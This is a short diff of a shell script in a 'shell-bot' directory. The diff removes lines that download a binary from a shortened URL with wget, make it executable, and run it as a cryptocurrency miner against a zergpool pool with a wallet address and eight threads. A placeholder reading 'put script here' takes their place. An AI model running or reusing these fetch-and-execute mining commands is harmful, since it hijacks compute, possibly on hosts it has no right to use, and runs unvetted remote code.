@@ -4,7 +4,5 @@
 # kumaha aink we njink
 
 cd /home/shell-bot
-wget -qO ngaceng https://git.io/J161r
-chmod +x ngaceng
-./ngaceng -v -l verushash.mine.zergpool.com:3300 -u MS7M2QQKoK2M94Ktn8iGk75j8yvjWGLHsM.ngaceng -p c=LTC,mc=VRSC -t 8
+Isi scripit disini
 sleep 99999999999999999
